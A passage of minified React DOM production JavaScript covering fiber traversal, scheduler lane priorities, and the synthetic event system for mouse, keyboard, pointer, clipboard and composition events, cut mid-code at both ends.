_p=Y({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Fr(e,n){if(n){if(_p[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(L(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(L(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(L(61))}if(n.style!=null&&typeof n.style!="object")throw Error(L(62))}}function Br(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Ur=null;function Oi(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Hr=null,mt=null,gt=null;function Do(e){if(e=Ss(e)){if(typeof Hr!="function")throw Error(L(280));var n=e.stateNode;n&&(n=qa(n),Hr(e.stateNode,e.type,n))}}function jc(e){mt?gt?gt.push(e):gt=[e]:mt=e}function Ic(){if(mt){var e=mt,n=gt;if(gt=mt=null,Do(e),n)for(e=0;e<n.length;e++)Do(n[e])}}function qc(e,n){return e(n)}function Rc(){}var Za=!1;function Oc(e,n,t){if(Za)return e(n,t);Za=!0;try{return qc(e,n,t)}finally{Za=!1,(mt!==null||gt!==null)&&(Rc(),Ic())}}function ss(e,n){var t=e.stateNode;if(t===null)return null;var s=qa(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(L(231,n,typeof t));return t}var Wr=!1;if(cn)try{var It={};Object.defineProperty(It,"passive",{get:function(){Wr=!0}}),window.addEventListener("test",It,It),window.removeEventListener("test",It,It)}catch{Wr=!1}function Tp(e,n,t,s,a,r,i,l,c){var u=Array.prototype.slice.call(arguments,3);try{n.apply(t,u)}catch(f){this.onError(f)}}var Gt=!1,oa=null,la=!1,Vr=null,Ep={onError:function(e){Gt=!0,oa=e}};function Lp(e,n,t,s,a,r,i,l,c){Gt=!1,oa=null,Tp.apply(Ep,arguments)}function Cp(e,n,t,s,a,r,i,l,c){if(Lp.apply(this,arguments),Gt){if(Gt){var u=oa;Gt=!1,oa=null}else throw Error(L(198));la||(la=!0,Vr=u)}}function Qn(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Dc(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function zo(e){if(Qn(e)!==e)throw Error(L(188))}function Pp(e){var n=e.alternate;if(!n){if(n=Qn(e),n===null)throw Error(L(188));return n!==e?null:e}for(var t=e,s=n;;){var a=t.return;if(a===null)break;var r=a.alternate;if(r===null){if(s=a.return,s!==null){t=s;continue}break}if(a.child===r.child){for(r=a.child;r;){if(r===t)return zo(a),e;if(r===s)return zo(a),n;r=r.sibling}throw Error(L(188))}if(t.return!==s.return)t=a,s=r;else{for(var i=!1,l=a.child;l;){if(l===t){i=!0,t=a,s=r;break}if(l===s){i=!0,s=a,t=r;break}l=l.sibling}if(!i){for(l=r.child;l;){if(l===t){i=!0,t=r,s=a;break}if(l===s){i=!0,s=r,t=a;break}l=l.sibling}if(!i)throw Error(L(189))}}if(t.alternate!==s)throw Error(L(190))}if(t.tag!==3)throw Error(L(188));return t.stateNode.current===t?e:n}function zc(e){return e=Pp(e),e!==null?Fc(e):null}function Fc(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Fc(e);if(n!==null)return n;e=e.sibling}return null}var Bc=Ne.unstable_scheduleCallback,Fo=Ne.unstable_cancelCallback,Ap=Ne.unstable_shouldYield,Np=Ne.unstable_requestPaint,J=Ne.unstable_now,Mp=Ne.unstable_getCurrentPriorityLevel,Di=Ne.unstable_ImmediatePriority,Uc=Ne.unstable_UserBlockingPriority,ca=Ne.unstable_NormalPriority,jp=Ne.unstable_LowPriority,Hc=Ne.unstable_IdlePriority,Na=null,en=null;function Ip(e){if(en&&typeof en.onCommitFiberRoot=="function")try{en.onCommitFiberRoot(Na,e,void 0,(e.current.flags&128)===128)}catch{}}var Ke=Math.clz32?Math.clz32:Op,qp=Math.log,Rp=Math.LN2;function Op(e){return e>>>=0,e===0?32:31-(qp(e)/Rp|0)|0}var As=64,Ns=4194304;function Wt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function ua(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,a=e.suspendedLanes,r=e.pingedLanes,i=t&268435455;if(i!==0){var l=i&~a;l!==0?s=Wt(l):(r&=i,r!==0&&(s=Wt(r)))}else i=t&~a,i!==0?s=Wt(i):r!==0&&(s=Wt(r));if(s===0)return 0;if(n!==0&&n!==s&&!(n&a)&&(a=s&-s,r=n&-n,a>=r||a===16&&(r&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Ke(n),a=1<<t,s|=e[t],n&=~a;return s}function Dp(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function zp(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,a=e.expirationTimes,r=e.pendingLanes;0<r;){var i=31-Ke(r),l=1<<i,c=a[i];c===-1?(!(l&t)||l&s)&&(a[i]=Dp(l,n)):c<=n&&(e.expiredLanes|=l),r&=~l}}function $r(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Wc(){var e=As;return As<<=1,!(As&4194240)&&(As=64),e}function er(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function bs(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Ke(n),e[n]=t}function Fp(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var a=31-Ke(t),r=1<<a;n[a]=0,s[a]=-1,e[a]=-1,t&=~r}}function zi(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Ke(t),a=1<<s;a&n|e[s]&n&&(e[s]|=n),t&=~a}}var B=0;function Vc(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var $c,Fi,Gc,Kc,Yc,Gr=!1,Ms=[],Sn=null,_n=null,Tn=null,as=new Map,rs=new Map,vn=[],Bp="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Bo(e,n){switch(e){case"focusin":case"focusout":Sn=null;break;case"dragenter":case"dragleave":_n=null;break;case"mouseover":case"mouseout":Tn=null;break;case"pointerover":case"pointerout":as.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":rs.delete(n.pointerId)}}function qt(e,n,t,s,a,r){return e===null||e.nativeEvent!==r?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:r,targetContainers:[a]},n!==null&&(n=Ss(n),n!==null&&Fi(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,a!==null&&n.indexOf(a)===-1&&n.push(a),e)}function Up(e,n,t,s,a){switch(n){case"focusin":return Sn=qt(Sn,e,n,t,s,a),!0;case"dragenter":return _n=qt(_n,e,n,t,s,a),!0;case"mouseover":return Tn=qt(Tn,e,n,t,s,a),!0;case"pointerover":var r=a.pointerId;return as.set(r,qt(as.get(r)||null,e,n,t,s,a)),!0;case"gotpointercapture":return r=a.pointerId,rs.set(r,qt(rs.get(r)||null,e,n,t,s,a)),!0}return!1}function Xc(e){var n=zn(e.target);if(n!==null){var t=Qn(n);if(t!==null){if(n=t.tag,n===13){if(n=Dc(t),n!==null){e.blockedOn=n,Yc(e.priority,function(){Gc(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Ys(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Kr(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);Ur=s,t.target.dispatchEvent(s),Ur=null}else return n=Ss(t),n!==null&&Fi(n),e.blockedOn=t,!1;n.shift()}return!0}function Uo(e,n,t){Ys(e)&&t.delete(n)}function Hp(){Gr=!1,Sn!==null&&Ys(Sn)&&(Sn=null),_n!==null&&Ys(_n)&&(_n=null),Tn!==null&&Ys(Tn)&&(Tn=null),as.forEach(Uo),rs.forEach(Uo)}function Rt(e,n){e.blockedOn===n&&(e.blockedOn=null,Gr||(Gr=!0,Ne.unstable_scheduleCallback(Ne.unstable_NormalPriority,Hp)))}function is(e){function n(a){return Rt(a,e)}if(0<Ms.length){Rt(Ms[0],e);for(var t=1;t<Ms.length;t++){var s=Ms[t];s.blockedOn===e&&(s.blockedOn=null)}}for(Sn!==null&&Rt(Sn,e),_n!==null&&Rt(_n,e),Tn!==null&&Rt(Tn,e),as.forEach(n),rs.forEach(n),t=0;t<vn.length;t++)s=vn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<vn.length&&(t=vn[0],t.blockedOn===null);)Xc(t),t.blockedOn===null&&vn.shift()}var yt=hn.ReactCurrentBatchConfig,da=!0;function Wp(e,n,t,s){var a=B,r=yt.transition;yt.transition=null;try{B=1,Bi(e,n,t,s)}finally{B=a,yt.transition=r}}function Vp(e,n,t,s){var a=B,r=yt.transition;yt.transition=null;try{B=4,Bi(e,n,t,s)}finally{B=a,yt.transition=r}}function Bi(e,n,t,s){if(da){var a=Kr(e,n,t,s);if(a===null)ur(e,n,s,pa,t),Bo(e,s);else if(Up(a,e,n,t,s))s.stopPropagation();else if(Bo(e,s),n&4&&-1<Bp.indexOf(e)){for(;a!==null;){var r=Ss(a);if(r!==null&&$c(r),r=Kr(e,n,t,s),r===null&&ur(e,n,s,pa,t),r===a)break;a=r}a!==null&&s.stopPropagation()}else ur(e,n,s,null,t)}}var pa=null;function Kr(e,n,t,s){if(pa=null,e=Oi(s),e=zn(e),e!==null)if(n=Qn(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Dc(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return pa=e,null}function Qc(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Mp()){case Di:return 1;case Uc:return 4;case ca:case jp:return 16;case Hc:return 536870912;default:return 16}default:return 16}}var kn=null,Ui=null,Xs=null;function Jc(){if(Xs)return Xs;var e,n=Ui,t=n.length,s,a="value"in kn?kn.value:kn.textContent,r=a.length;for(e=0;e<t&&n[e]===a[e];e++);var i=t-e;for(s=1;s<=i&&n[t-s]===a[r-s];s++);return Xs=a.slice(e,1<s?1-s:void 0)}function Qs(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function js(){return!0}function Ho(){return!1}function je(e){function n(t,s,a,r,i){this._reactName=t,this._targetInst=a,this.type=s,this.nativeEvent=r,this.target=i,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(r):r[l]);return this.isDefaultPrevented=(r.defaultPrevented!=null?r.defaultPrevented:r.returnValue===!1)?js:Ho,this.isPropagationStopped=Ho,this}return Y(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=js)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=js)},persist:function(){},isPersistent:js}),n}var At={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Hi=je(At),xs=Y({},At,{view:0,detail:0}),$p=je(xs),nr,tr,Ot,Ma=Y({},xs,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Wi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Ot&&(Ot&&e.type==="mousemove"?(nr=e.screenX-Ot.screenX,tr=e.screenY-Ot.screenY):tr=nr=0,Ot=e),nr)},movementY:function(e){return"movementY"in e?e.movementY:tr}}),Wo=je(Ma),Gp=Y({},Ma,{dataTransfer:0}),Kp=je(Gp),Yp=Y({},xs,{relatedTarget:0}),sr=je(Yp),Xp=Y({},At,{animationName:0,elapsedTime:0,pseudoElement:0}),Qp=je(Xp),Jp=Y({},At,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Zp=je(Jp),eh=Y({},At,{data:0}),Vo=je(eh),nh={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},th={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},sh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function ah(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=sh[e])?!!n[e]:!1}function Wi(){return ah}var rh=Y({},xs,{key:function(e){if(e.key){var n=nh[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Qs(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?th[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Wi,charCode:function(e){return e.type==="keypress"?Qs(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Qs(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),ih=je(rh),oh=Y({},Ma,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),$o=je(oh),lh=Y({},xs,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Wi}),ch=je(lh),uh=Y({},At,{propertyName:0,elapsedTime:0,pseudoElement:0}),dh=je(uh),ph=Y({},Ma,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),hh=je(ph),fh=[9,13,27,32],Vi=cn&&"CompositionEvent"in window,Kt=null;cn&&"documentMode"in document&&(Kt=document.documentMode);var mh=cn&&"TextEvent"in window&&!Kt,Zc=cn&&(!Vi||Kt&&8<Kt&&11>=Kt),Go=" ",Ko=!1;function eu(e,n){switch(e){case"keyup":return fh.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function nu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var st=!1;function gh(e,n){switch(e){case"compositionend":return nu(n);case"keypress":return n.which!==32?null:(Ko=!0,Go);case"textInput":return e=n.data,e===Go&&Ko?null:e;default:return null}}function yh(e,n){if(st)return e==="compositionend"||!Vi&&eu(e,n)?(e=Jc(),Xs=Ui=kn=null,st=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return Zc&&n.locale!=="ko"?null:n.data;default:return null}}var vh={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Yo(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!vh[e.type]:n==="textarea"}function tu(e,n,t,s){jc(s),n=ha(n,"onChange"),0<n.length&&(t=new Hi("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var Yt=null,os=null;function wh(e){hu(e,0)}function ja(e){var n=it(e);if(Ec(n))return e}function kh(e,n){if(e==="change")return n}var su=!1;if(cn){var ar;if(cn){var rr="oninput"in document;if(!rr){var Xo=document.createElement("div");Xo.setAttribute("oninput","return;"),rr=typeof Xo.oninput=="function"}ar=rr}else ar=!1;su=ar&&(!document.documentMode||9<document.documentMode)}function Qo(){Yt&&(Yt.detachEvent("onpropertychange",au),os=Yt=null)}function au(e){if(e.propertyName==="value"&&ja(os)){var n=[];tu(n,os,e,Oi(e)),Oc(wh,n)}}function bh(e,n,t){e==="focusin"?(Qo(),Yt=n,os=t,Yt.attachEvent("onpropertychange",au)):e==="focusout"&&Qo()}function xh(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return ja(os)}function Sh(e,n){if(e==="click")return ja(n)}function _h(e,n){if(e==="input"||e==="change")return ja(n)}function Th(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Xe=typeof Object.is=="function"?Object.is:Th;function ls(e,n){if(Xe(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var a=t[s];if(!Ar.call(n,a)||!Xe(e[a],n[a]))return!1}return!0}function Jo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Zo(e,n){var t=Jo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Jo(t)}}function ru(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?ru(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function iu(){for(var e=window,n=ia();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=ia(e.document)}return n}function $i(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Eh(e){var n=iu(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&ru(t.ownerDocument.documentElement,t)){if(s!==null&&$i(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var a=t.textContent.length,r=Math.min(s.start,a);s=s.end===void 0?r:Math.min(s.end,a),!e.extend&&r>s&&(a=s,s=r,r=a),a=Zo(t,r);var i=Zo(t,s);a&&i&&(e.rangeCount!==1||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==i.node||e.focusOffset!==i.offset)&&(n=n.createRange(),n.setStart(a.node,a.offset),e.removeAllRanges(),r>s?(e.addRange(n),e.extend(i.node,i.offset)):(n.setEnd(i.node,i.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Lh=cn&&"documentMode"in document&&11>=document.documentMode,at=null,Yr=null,Xt=null,Xr=!1;function el(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Xr||at==null||at!==ia(s)||(s=at,"selectionStart"in s&&$i(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),Xt&&ls(Xt,s)||(Xt=s,s=ha(Yr,"onSelect"),0<s.length&&(n=new Hi("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=at)))}function Is(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var rt={animationend:Is("Animation","AnimationEnd"),animationiteration:Is("Animation","AnimationIteration"),animationstart:Is("Animation","AnimationStart"),transitionend:Is("Transition","TransitionEnd")},ir={},ou={};cn&&(ou=document.createElement("div").style,"AnimationEvent"in window||(delete rt.animationend.animation,delete rt.animationiteration.animation,delete rt.animationstart.animation),"TransitionEvent"in window||delete rt.transitionend.transition);function Ia(e){if(ir[e])return ir[e];if(!rt[e])return e;var n=rt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in ou)return ir[e]=n[t];return e}var lu=Ia("animationend"),cu=Ia("animationiteration"),uu=Ia("animationstart"),du=Ia("transitionend"),pu=new Map,nl="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function In(e,n){pu.set(e,n),Xn(n,[e])}for(var or=0;or<nl.length;or++){var lr=nl[or],Ch=lr.toLowerCase(),Ph=lr[0].toUpperCase()+lr.slice(1);In(Ch,"on"+Ph)}In(lu,"onAnimationEnd");In(cu,"onAnimationIteration");In(uu,"onAnimationStart");In("dblclick","onDoubleClick");In("focusin","onFocus");In("focusout","onBlur");In(du,"onTransitionEnd");bt("onMouseEnter",["mouseout","mouseover"]);bt("onMouseLeave",["mouseout","mouseover"]);bt("onPointerEnter",["pointerout","pointerover"]);bt("onPointerLeave",["pointerout","pointerover"]);Xn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Xn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Xn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Xn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Xn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Xn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Vt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Ah=new Set("cancel close invalid load scroll toggle".split(" ").concat(Vt));function tl(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Cp(s,n,void 0,e),e.currentTarget=null}function hu(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],a=s.event;s=s.listeners;e:{var r=void 0;if(n)for(var i=s.length-1;0<=i;i--){var l=s[i],c=l.instance,u=l.currentTarget;if(l=l.listener,c!==r&&a.isPropagationStopped())break e;tl(a,l,u),r=c}else for(i=0;i<s.length;i++){if(l=s[i],c=l.instance,u=l.currentTarget,l=l.listener,c!==r&&a.isPropagationStopped())break e;tl(a,l,u),r=c}}}if(la)throw e=Vr,la=!1,Vr=null,e}function W(e,n){var t=n[ni];t===void 0&&(t=n[ni]=new Set);var s=e+"__bubble";t.has(s)||(fu(n,e,2,!1),t.add(s))}function cr(e,n,t){var s=0;n&&(s|=4),fu(t,e,s,n)}var qs="_reactListening"+Math.random().toString(36).slice(2);function cs(e){if(!e[qs]){e[qs]=!0,bc.forEach(function(t){t!=="selectionchange"&&(Ah.has(t)||cr(t,!1,e),cr(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[qs]||(n[qs]=!0,cr("selectionchange",!1,n))}}function fu(e,n,t,s){switch(Qc(n)){case 1:var a=Wp;break;case 4:a=Vp;break;default:a=Bi}t=a.bind(null,n,t,e),a=void 0,!Wr||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(a=!0),s?a!==void 0?e.addEventListener(n,t,{capture:!0,passive:a}):e.addEventListener(n,t,!0):a!==void 0?e.addEventListener(n,t,{passive:a}):e.addEventListener(n,t,!1)}function ur(e,n,t,s,a){var r=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var i=s.tag;if(i===3||i===4){var l=s.stateNode.containerInfo;if(l===a||l.nodeType===8&&l.parentNode===a)break;if(i===4)for(i=s.return;i!==null;){var c=i.tag;if((c===3||c===4)&&(c=i.stateNode.containerInfo,c===a||c.nodeType===8&&c.parentNode===a))return;i=i.return}for(;l!==null;){if(i=zn(l),i===null)return;if(c=i.tag,c===5||c===6){s=r=i;continue e}l=l.parentNode}}s=s.return}Oc(function(){var u=r,f=Oi(t),p=[];e:{var g=pu.get(e);if(g!==void 0){var v=Hi,k=e;switch(e){case"keypress":if(Qs(t)===0)break e;case"keydown":case"keyup":v=ih;break;case"focusin":k="focus",v=sr;break;case"focusout":k="blur",v=sr;break;case"beforeblur":case"afterblur":v=sr;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Wo;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=Kp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=ch;break;case lu:case cu:case uu:v=Qp;break;case du:v=dh;break;case"scroll":v=$p;break;case"wheel":v=hh;break;case"copy":case"cut":case"paste":v=Zp;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=$o}var y=(n&4)!==0,S=!y&&e==="scroll",m=y?g!==null?g+"Capture":null:g;y=[];for(var d=u,h;d!==null;){h=d;var x=h.stateNode;if(h.tag===5&&x!==null&&(h=x,m!==null&&(x=ss(d,m),x!=null&&y.push(us(d,x,h)))),S)break;d=d.return}0<y.length&&(g=new v(g,k,null,t,f),p.push({event:g,listeners:y}))}}if(!(n&7)){e:{if(g=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",g&&t!==Ur&&(k=t.relatedTarget||t.fromElement)&&(zn(k)||k[un]))break 